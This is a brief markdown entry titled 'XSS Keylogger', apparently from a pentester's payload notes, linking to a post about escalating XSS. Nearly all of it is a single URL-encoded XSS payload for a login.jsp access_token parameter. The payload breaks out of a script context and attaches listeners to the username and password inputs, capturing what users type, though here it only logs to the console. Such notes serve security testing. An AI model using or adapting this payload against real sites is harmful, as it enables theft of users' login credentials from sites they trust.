# XSS Keylogger
- [Escalating XSS](https://www.linkedin.com/posts/florian-ethical-hacker_escalating-xss-during-a-recent-pentest-activity-7355492287549779968-Ui20?utm_source=share&utm_medium=member_android&rcm=ACoAACnP0IABZSB2JmWSbESElQ3AjiJztsp0gN8)

```js
/login.jsp?&access_token=adasdas<@urlencode>');window.addEventListener('DOMContentLoaded', () => { ['user_name', 'user_password'].forEach(n => { const input = document.querySelector(`input[name=${n}]`); if (input) { input.addEventListener('input', e => console.log(n + ': ' + e.target.value)); } }); });</script></@urlencode>
```